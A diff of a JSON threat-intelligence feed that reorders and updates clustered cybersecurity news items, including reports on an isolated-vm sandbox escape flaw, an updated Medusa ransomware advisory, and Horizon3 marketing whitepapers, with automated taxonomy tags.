+        "summary": "Cybersecurity researchers have disclosed a critical security flaw in isolated-vm, a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability (\"GHSA-864f-rcv7-6rh4\"), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0.",
+        "full_body": "Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE  Ravie Lakshmanan  Aug 20, 2026 Vulnerability / Application Security Cybersecurity researchers have disclosed a critical security flaw in isolated-vm , a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability (\" GHSA-864f-rcv7-6rh4 \"), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0. It has been patched in versions 6.2.0 and 7.0.1 released earlier this month. Isolated-vm is a Node.js library for running untrusted JavaScript inside a V8 Isolate , an independent instance of the Google V8 JavaScript engine, allowing multiple sandboxed JavaScript environments to run concurrently without sharing data or interfering with each other. The npm package has witnessed nearly 1 million downloads over the past week. Because each V8 Isolate has a separate state and maintains its own heap, it is not possible to directly pass JavaScript objects from the main Node.js thread into a worker isolate. Isolated-vm exposes a class called ExternalCopy to securely serialize JavaScript objects out of the host isolate and deserialize them into the guest isolate. The vulnerability identified by Endor Labs resides in this component, allowing code running inside the sandbox to break out and corrupt memory in the host application. \"A type confusion in ExternalCopy's handling of the transferList option lets code running inside the sandbox corrupt memory in the host process,\" Endor Labs researcher Cristian-Alexandru Staicu, who is credited with discovering and reporting the flaw, said in a technical write-up shared with The Hacker News. \"Starting from nothing but a single ivm.Reference, the standard way hosts hand a sandbox any capability at all, we escalated the bug from a controlled-address crash all the way to hijacking the host's control flow, demonstrating a full guest-to-host sandbox escape.\" Successful exploitation of the flaw allows memory corruption in the host process, causing the host process to crash with a segmentation fault ( SIGSEGV ). It can also lead to a guest-to-host sandbox escape and an erosion of the trust boundary that undermines the very purpose of isolated-vm. \"Minimum demonstrated impact is a reliable, controlled-address crash (denial-of-service) triggerable by any guest that has been given an ivm.Reference (the standard way to grant a sandbox any capability),\" project maintainer Marcel Laverdet said in an advisory. \"Maximum demonstrated impact is control-flow hijack of the host process, i.e., potential remote code execution in the host.\" Users who have isolated-vm installed in their developer environments are advised to update to the latest version for optimal protection. Additional details of the full exploit have been withheld so as to prevent bad actors from launching their own attacks. \"The most important takeaway is that what was not broken was the isolation primitive itself,\" Staicu said. \"V8's Isolate boundary held. What failed was the C++ glue code that marshals values across that boundary. A perfectly sound building block was undermined by the binding layer wrapped around it.\" Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Developer Security , JavaScript , Open Source , remote code execution , Sandbox Security , Vulnerability ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "credential_theft",
+            "ddos"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "telecommunications"
+          ],
+          "affected_products": [
+            "GitHub",
+            "Azure",
+            "Anthropic/Claude"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "GitHub": "target",
+            "Azure": "target",
+            "Anthropic/Claude": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "The Hacker News",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE",
+          "link": "https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html",
+          "published": "2026-08-20T13:48:24+00:00",
+          "summary": "Cybersecurity researchers have disclosed a critical security flaw in isolated-vm, a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability (\"GHSA-864f-rcv7-6rh4\"), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0.",
+          "taxonomy": {
+            "threat_categories": [
+              "credential_theft",
+              "ddos"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "telecommunications"
+            ],
+            "affected_products": [
+              "GitHub",
+              "Azure",
+              "Anthropic/Claude"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "GitHub": "target",
+              "Azure": "target",
+              "Anthropic/Claude": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Wiz Research",
+          "cohort": "cloud_identity_infrastructure",
+          "title": "Wiz Red Agent Finds Its Way Into Snowflake’s Internal Jira Through a Flaw in a GitHub Copilot–Assisted PR",
+          "link": "https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug",
+          "published": "2026-08-17T14:00:00+00:00",
+          "summary": "Wiz Red Agent independently discovered and exploited a GitHub Actions injection missed by GitHub’s Advanced Security, validated access to sensitive data in Snowflake’s internal Jira, and assessed the blast radius—all without human intervention, five days after the flaw became live.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "GitHub",
+              "Snowflake",
+              "Atlassian Jira"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {
+              "GitHub": "target",
+              "Snowflake": "target",
+              "Atlassian Jira": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Reddit r/netsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "How a popular Android library silently exposed thousands of apps to Arbitrary File Overwrite (AFO). https://itis911.github.io/writeups/cropper-vulnerability.html",
+          "link": "https://www.reddit.com/r/netsec/comments/1vru26k/how_a_popular_android_library_silently_exposed/",
+          "published": "2026-08-18T16:24:33+00:00",
+          "summary": "submitted by /u/Fit_Veterinarian4403 [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "GitHub"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_5_chatter",
+            "role_map": {
+              "GitHub": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -3493,177 +3494,6 @@
       ]
     },
     {
-      "cluster_id": "a40b955a81",
-      "priority_score": 11,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "apt_espionage",
-          "supply_chain"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "critical_infrastructure",
-          "government",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Horizon3 Attack Research",
-        "cohort": "offensive_vulnerability_research",
-        "title": "Building Capacity and Resilience for U.S. Partners",
-        "link": "https://horizon3.ai/downloads/whitepapers/cyber-diplomacy-capacity-resilience/",
-        "published": "2026-08-19T16:19:49+00:00",
-        "summary": "Explore how cyber diplomacy can become an operational capability that helps governments and partners reduce exploitable risk and strengthen resilience across shared ecosystems.",
-        "full_body": "Building Capacity and Resilience for U.S. Partners Horizon3 | August 19, 2026 | Whitepapers Table of Contents Cyber diplomacy has to move at the speed of the threat. Nation-state actors and cybercriminals are using AI to find weaknesses, accelerate attacks, and exploit interconnected environments. Defending against them requires more than securing individual organizations. It means strengthening resilience across the partners, suppliers, critical infrastructure providers, and allies we depend on. Building Capacity and Resilience for U.S. Partners: The Art of Cyber Diplomacy explores how governments and their partners can turn cyber diplomacy into an operational capability that reduces exploitable attack paths before adversaries weaponize them. Move cyber capacity building left of boom Threat intelligence, incident response, shared tradecraft, and international collaboration remain essential. But against adversaries operating at machine speed, information sharing alone is not enough. The next step is proactive: give partners the ability to identify what attackers can actually exploit, fix the weaknesses that matter, verify remediation, and repeat at scale. What You’ll Learn How cyber diplomacy is becoming operational See how CERTs, international coalitions, shared tradecraft, and scalable security platforms can turn one-time assistance into repeatable capacity-building programs. What the DIB model proves Explore how the NSA Cybersecurity Collaboration Center’s Cybersecurity as a Service model is helping protect 700+ Defense Industrial Base companies and 2.9M+ endpoints while giving under-resourced partners access to scalable cybersecurity capabilities. Why offense-informed defense matters Learn how mapping real attack paths across internal, external, cloud, and supply-chain environments helps defenders move beyond theoretical exposure and focus remediation on what attackers can actually exploit. How AI changes the equation Discover how AI-driven security can help defenders operate at machine speed, prioritize exploitable weaknesses, verify remediation, and reduce risk across entire ecosystems. Cyber resilience is a shared mission Adversaries do not respect organizational boundaries, national borders, or the distinction between .gov, .mil, and .com. A weakness in one partner can become an attack path into an entire ecosystem. Modern cyber diplomacy gives partners the capabilities to act. Governments, allies, and critical partners can hack, fix, verify, and repeat on-demand while gaining a clearer view of systemic risk and where coordinated remediation can have the greatest impact. Download the Whitepaper Share:",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "supply_chain",
-            "apt_espionage"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "government",
-            "critical_infrastructure",
-            "manufacturing_industrial"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Horizon3 Attack Research",
-          "cohort": "offensive_vulnerability_research",
-          "title": "Building Capacity and Resilience for U.S. Partners",
-          "link": "https://horizon3.ai/downloads/whitepapers/cyber-diplomacy-capacity-resilience/",
-          "published": "2026-08-19T16:19:49+00:00",
-          "summary": "Explore how cyber diplomacy can become an operational capability that helps governments and partners reduce exploitable risk and strengthen resilience across shared ecosystems.",
-          "taxonomy": {
-            "threat_categories": [
-              "supply_chain",
-              "apt_espionage"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "government",
-              "critical_infrastructure",
-              "manufacturing_industrial"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "ad04e78fc6",
-      "priority_score": 11,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Horizon3 Attack Research",
-        "cohort": "offensive_vulnerability_research",
-        "title": "CTEM: From Visibility to Measurable Risk Reduction",
-        "link": "https://horizon3.ai/intelligence/infographics/ctem-from-visibility-to-measurable-risk-reduction/",
-        "published": "2026-08-19T16:10:35+00:00",
-        "summary": "Learn how to operationalize CTEM as a continuous cycle that validates exploitable risk, prioritizes what matters, verifies remediation, and drives measurable risk reduction.",
-        "full_body": "CTEM: From Visibility to Measurable Risk Reduction Horizon3 August 19, 2026 Infographics Close the CTEM Loop Visibility alone does not reduce risk. Security teams have more exposure data than ever, but still struggle to answer the questions that matter: What can an attacker actually exploit? Which exposures create meaningful business risk? And did remediation actually reduce that risk? This infographic shows how to operationalize Continuous Threat Exposure Management (CTEM) as a repeatable cycle to discover exposure, validate what is exploitable, prioritize based on impact, remediate with clarity and ownership, and verify that fixes work. See CTEM in Action See how the CTEM operating cycle connects discovery, validation, prioritization, remediation, and verification across your attack surface to help teams focus on exploitable risk, close attack paths, and measure whether exposure is actually decreasing over time. Download the Infographic How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Horizon3 Attack Research",
-          "cohort": "offensive_vulnerability_research",
-          "title": "CTEM: From Visibility to Measurable Risk Reduction",
-          "link": "https://horizon3.ai/intelligence/infographics/ctem-from-visibility-to-measurable-risk-reduction/",
-          "published": "2026-08-19T16:10:35+00:00",
-          "summary": "Learn how to operationalize CTEM as a continuous cycle that validates exploitable risk, prioritizes what matters, verifies remediation, and drives measurable risk reduction.",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "8a66834bf6",
       "priority_score": 10,
       "member_count": 1,
@@ -4100,6 +3930,177 @@
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "a40b955a81",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "apt_espionage",
+          "supply_chain"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "critical_infrastructure",
+          "government",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research"
+        ]
+      },
+      "primary": {
+        "source": "Horizon3 Attack Research",
+        "cohort": "offensive_vulnerability_research",
+        "title": "Building Capacity and Resilience for U.S. Partners",
+        "link": "https://horizon3.ai/downloads/whitepapers/cyber-diplomacy-capacity-resilience/",
+        "published": "2026-08-19T16:19:49+00:00",
+        "summary": "Explore how cyber diplomacy can become an operational capability that helps governments and partners reduce exploitable risk and strengthen resilience across shared ecosystems.",
+        "full_body": "Building Capacity and Resilience for U.S. Partners Horizon3 | August 19, 2026 | Whitepapers Table of Contents Cyber diplomacy has to move at the speed of the threat. Nation-state actors and cybercriminals are using AI to find weaknesses, accelerate attacks, and exploit interconnected environments. Defending against them requires more than securing individual organizations. It means strengthening resilience across the partners, suppliers, critical infrastructure providers, and allies we depend on. Building Capacity and Resilience for U.S. Partners: The Art of Cyber Diplomacy explores how governments and their partners can turn cyber diplomacy into an operational capability that reduces exploitable attack paths before adversaries weaponize them. Move cyber capacity building left of boom Threat intelligence, incident response, shared tradecraft, and international collaboration remain essential. But against adversaries operating at machine speed, information sharing alone is not enough. The next step is proactive: give partners the ability to identify what attackers can actually exploit, fix the weaknesses that matter, verify remediation, and repeat at scale. What You’ll Learn How cyber diplomacy is becoming operational See how CERTs, international coalitions, shared tradecraft, and scalable security platforms can turn one-time assistance into repeatable capacity-building programs. What the DIB model proves Explore how the NSA Cybersecurity Collaboration Center’s Cybersecurity as a Service model is helping protect 700+ Defense Industrial Base companies and 2.9M+ endpoints while giving under-resourced partners access to scalable cybersecurity capabilities. Why offense-informed defense matters Learn how mapping real attack paths across internal, external, cloud, and supply-chain environments helps defenders move beyond theoretical exposure and focus remediation on what attackers can actually exploit. How AI changes the equation Discover how AI-driven security can help defenders operate at machine speed, prioritize exploitable weaknesses, verify remediation, and reduce risk across entire ecosystems. Cyber resilience is a shared mission Adversaries do not respect organizational boundaries, national borders, or the distinction between .gov, .mil, and .com. A weakness in one partner can become an attack path into an entire ecosystem. Modern cyber diplomacy gives partners the capabilities to act. Governments, allies, and critical partners can hack, fix, verify, and repeat on-demand while gaining a clearer view of systemic risk and where coordinated remediation can have the greatest impact. Download the Whitepaper Share:",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "supply_chain",
+            "apt_espionage"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "government",
+            "critical_infrastructure",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Horizon3 Attack Research",
+          "cohort": "offensive_vulnerability_research",
+          "title": "Building Capacity and Resilience for U.S. Partners",
+          "link": "https://horizon3.ai/downloads/whitepapers/cyber-diplomacy-capacity-resilience/",
+          "published": "2026-08-19T16:19:49+00:00",
+          "summary": "Explore how cyber diplomacy can become an operational capability that helps governments and partners reduce exploitable risk and strengthen resilience across shared ecosystems.",
+          "taxonomy": {
+            "threat_categories": [
+              "supply_chain",
+              "apt_espionage"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "government",
+              "critical_infrastructure",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "ad04e78fc6",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research"
+        ]
+      },
+      "primary": {
+        "source": "Horizon3 Attack Research",
+        "cohort": "offensive_vulnerability_research",
+        "title": "CTEM: From Visibility to Measurable Risk Reduction",
+        "link": "https://horizon3.ai/intelligence/infographics/ctem-from-visibility-to-measurable-risk-reduction/",
+        "published": "2026-08-19T16:10:35+00:00",
+        "summary": "Learn how to operationalize CTEM as a continuous cycle that validates exploitable risk, prioritizes what matters, verifies remediation, and drives measurable risk reduction.",
+        "full_body": "CTEM: From Visibility to Measurable Risk Reduction Horizon3 August 19, 2026 Infographics Close the CTEM Loop Visibility alone does not reduce risk. Security teams have more exposure data than ever, but still struggle to answer the questions that matter: What can an attacker actually exploit? Which exposures create meaningful business risk? And did remediation actually reduce that risk? This infographic shows how to operationalize Continuous Threat Exposure Management (CTEM) as a repeatable cycle to discover exposure, validate what is exploitable, prioritize based on impact, remediate with clarity and ownership, and verify that fixes work. See CTEM in Action See how the CTEM operating cycle connects discovery, validation, prioritization, remediation, and verification across your attack surface to help teams focus on exploitable risk, close attack paths, and measure whether exposure is actually decreasing over time. Download the Infographic How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Horizon3 Attack Research",
+          "cohort": "offensive_vulnerability_research",
+          "title": "CTEM: From Visibility to Measurable Risk Reduction",
+          "link": "https://horizon3.ai/intelligence/infographics/ctem-from-visibility-to-measurable-risk-reduction/",
+          "published": "2026-08-19T16:10:35+00:00",
+          "summary": "Learn how to operationalize CTEM as a continuous cycle that validates exploitable risk, prioritizes what matters, verifies remediation, and drives measurable risk reduction.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research",
             "role_map": {},
             "weak_tags": {
               "products": []
@@ -4867,7 +4868,7 @@
         "link": "https://cyberscoop.com/medusa-ransomware-tactics-cisa-advisory/",
         "published": "2026-08-18T17:18:58+00:00",
         "summary": "The updated warning from the FBI, CISA and HHS draws on a year’s worth of investigations to detail how the group gains initial access and what it does afterward. The post Medusa ransomware tallies hundreds of new victims, says updated advisory on group’s tactics appeared first on CyberScoop .",
-        "full_body": "Advertisement Get our latest cybersecurity news first on Google. Click here! Close The ransomware-as-a-service group Medusa has adopted fresh tactics to gain access and added hundreds of victims in a little more than a year, according to an updated U.S. government advisory published Tuesday. The gang is relying on access brokers,compensating them anywhere from $100 to $1 million, with higher prices going to those who work exclusively with Medusa. However, most of the brokers work simultaneously for “multiple variants at the same time,” the advisory from the Cybersecurity and Infrastructure Security Agency, FBI and Health and Human Services Department states in one of the updated portions of the advisory. Tuesday’s update advisory expands upon aMarch 2025 advisory, drawing on ongoing FBI investigations.nIt includes information on the kinds of software vulnerabilities Medusa has exploited, such as Fortra GoAnywhere and BeyondTrust flaws. “Medusa actors operate opportunistically by targeting victims with unpatched software rather than focusing on specific organizations or sectors; however, the Healthcare and Public Health (HPH) Sector has been a frequent victim of Medusa operations,” according to the advisory. “Medusa actors leverage newly announced exploits within 24 hours and have been observed to use exploits up to a week before public vulnerability disclosure.’ Advertisement “However, there is no indication Medusa actors develop their own zero-day or N-day vulnerabilities, preferring instead to obtain advanced access to exploits from unknown sources or to quickly leverage newly announced exploits before potential victims can mitigate vulnerabilities through patching,” the advisory continues. The approach appears to be netting gains: From March 2025 to April of this year, the victim tally in the advisory jumped from more than 300 to more than 500. The group was first identified in 2021. “Medusa actors often use legitimate tools and living off the land techniques to evade detection. They may also leverage remote monitoring and management software and remote access services, including Remote Desktop Protocol, for lateral movement,” as updated sections of the advisory detail. “Once inside a network, they use common utilities and tools to support credential access, data exfiltration, and ransomware deployment.” Earlier this year, Microsoft detailed how a group it dubbed Storm-1175 was making use of Medusa ransomware in speedy operations. Symantec and Carbon Black also detailed earlier this year how North Korean hackers were leaning on Medusa to target the health care sector. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops The headquarters of the Federal Bureau of Investigation on August 16, 2022, in Washington. (Matt McClain/The Washington Post via Getty Images) (Getty Images) A sign is seen at Microsoft headquarters on July 3, 2024, in Redmond, Washington. (David Ryder/Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity The world still treats bug hunters like criminals The SOC wasn’t built for this Why Cybersecurity is at the heart of the US-China AI race Government Irregular says ‘human oversight’ responsible for AI sandbox escape incidents A bold new strategy or a dangerous precedent? Experts are divided on Trump's memo. Trump turns to private sector in offensive hacking operations memo Federal judge issues second order blocking Trump mail-in voting directive Technology AI’s ‘middle class’ has gotten dramatically better at hacking The FTC wants to regulate AI for ideological bias OpenAI says Daybreak will expand to offer specialized cyber services More than half of AI-generated patches are broken Threats Details emerge on BlackFile's recent attacks on financial companies Tech contractor for Brightly Software sentenced to 2 years in prison for insider attack Researchers observe first ‘near-autonomous’ AI attack o",
+        "full_body": "Advertisement Get our latest cybersecurity news first on Google. Click here! Close The ransomware-as-a-service group Medusa has adopted fresh tactics to gain access and added hundreds of victims in a little more than a year, according to an updated U.S. government advisory published Tuesday. The gang is relying on access brokers,compensating them anywhere from $100 to $1 million, with higher prices going to those who work exclusively with Medusa. However, most of the brokers work simultaneously for “multiple variants at the same time,” the advisory from the Cybersecurity and Infrastructure Security Agency, FBI and Health and Human Services Department states in one of the updated portions of the advisory. Tuesday’s update advisory expands upon aMarch 2025 advisory, drawing on ongoing FBI investigations.nIt includes information on the kinds of software vulnerabilities Medusa has exploited, such as Fortra GoAnywhere and BeyondTrust flaws. “Medusa actors operate opportunistically by targeting victims with unpatched software rather than focusing on specific organizations or sectors; however, the Healthcare and Public Health (HPH) Sector has been a frequent victim of Medusa operations,” according to the advisory. “Medusa actors leverage newly announced exploits within 24 hours and have been observed to use exploits up to a week before public vulnerability disclosure.’ Advertisement “However, there is no indication Medusa actors develop their own zero-day or N-day vulnerabilities, preferring instead to obtain advanced access to exploits from unknown sources or to quickly leverage newly announced exploits before potential victims can mitigate vulnerabilities through patching,” the advisory continues. The approach appears to be netting gains: From March 2025 to April of this year, the victim tally in the advisory jumped from more than 300 to more than 500. The group was first identified in 2021. “Medusa actors often use legitimate tools and living off the land techniques to evade detection. They may also leverage remote monitoring and management software and remote access services, including Remote Desktop Protocol, for lateral movement,” as updated sections of the advisory detail. “Once inside a network, they use common utilities and tools to support credential access, data exfiltration, and ransomware deployment.” Earlier this year, Microsoft detailed how a group it dubbed Storm-1175 was making use of Medusa ransomware in speedy operations. Symantec and Carbon Black also detailed earlier this year how North Korean hackers were leaning on Medusa to target the health care sector. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops The headquarters of the Federal Bureau of Investigation on August 16, 2022, in Washington. (Matt McClain/The Washington Post via Getty Images) (Getty Images) A sign is seen at Microsoft headquarters on July 3, 2024, in Redmond, Washington. (David Ryder/Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity The world still treats bug hunters like criminals The SOC wasn’t built for this Why Cybersecurity is at the heart of the US-China AI race Government Eight years later, federal authorities re-up charges against alleged Iranian hackers at Mabna Institute Irregular says ‘human oversight’ responsible for AI sandbox escape incidents A bold new strategy or a dangerous precedent? Experts are divided on Trump's memo. Trump turns to private sector in offensive hacking operations memo Technology AI’s ‘middle class’ has gotten dramatically better at hacking The FTC wants to regulate AI for ideological bias OpenAI says Daybreak will expand to offer specialized cyber services More than half of AI-generated patches are broken Threats Details emerge on BlackFile's recent attacks on financial companies Tech contractor for Brightly Software sentenced to 2 years in prison for insider attack Researchers observe first",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
@@ -5196,138 +5197,6 @@
       ]
     },
     {
-      "cluster_id": "e50251994f",
-      "priority_score": 10,
-      "member_count": 3,
-      "corroborating_source_count": 2,
-      "strong_signals": [
-        "Google Cloud",
-        "Google/Gemini"
-      ],
-      "taxonomy": {
-        "threat_categories": [
-          "credential_theft"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services"
-        ],
-        "affected_products": [
-          "Google Cloud",
-          "Google/Gemini"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_2_operator",
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Google Cloud Security",
-        "cohort": "cloud_identity_infrastructure",
-        "title": "Serverless Apache Spark on Google Cloud: Architecture Choices & AI Troubleshooting",
-        "link": "https://cloud.google.com/blog/products/data-analytics/serverless-apache-spark-on-google-cloud-architecture-ai-troubleshooting/",
-        "published": "2026-08-19T16:00:00+00:00",
-        "summary": "In modern enterprise data engineering, Apache Spark remains a cornerstone framework for processing massive datasets at scale. However, managing infrastructure such as provisioning clusters, tuning YARN configurations, and avoiding costs for idle hardware often detracts from what matters most: building resilient data pipelines. Google Cloud addresses this operational overhead via its Managed Service for Apache Spark , offering flexible deployment modes of serverless and managed clusters tailored to specific operational needs. This technical guide walks through the architectural decision matrix for deploying Spark on Google Cloud, details resource and cost optimization techniques, and demonstrates how to apply built-in Gemini Cloud Assist to rapidly troubleshoot and resolve serverless batch pipeline failures. While there is benefit to reading these three parts in a sequence, each one can be read independently and add value to how you approach Spark development on Google Cloud. Part 1: Ch",
-        "full_body": "Data Analytics Serverless Apache Spark on Google Cloud: Architecture Choices & AI Troubleshooting August 19, 2026 Lior (Leo) Ginzberg Data & Analytics Customer Engineer, Google Cloud Try Gemini Enterprise Business Edition today The front door to AI in the workplace Try now In modern enterprise data engineering, Apache Spark remains a cornerstone framework for processing massive datasets at scale. However, managing infrastructure such as provisioning clusters, tuning YARN configurations, and avoiding costs for idle hardware often detracts from what matters most: building resilient data pipelines. Google Cloud addresses this operational overhead via its Managed Service for Apache Spark , offering flexible deployment modes of serverless and managed clusters tailored to specific operational needs. This technical guide walks through the architectural decision matrix for deploying Spark on Google Cloud, details resource and cost optimization techniques, and demonstrates how to apply built-in Gemini Cloud Assist to rapidly troubleshoot and resolve serverless batch pipeline failures. While there is benefit to reading these three parts in a sequence, each one can be read independently and add value to how you approach Spark development on Google Cloud. Part 1: Choosing your Apache Spark deployment model When 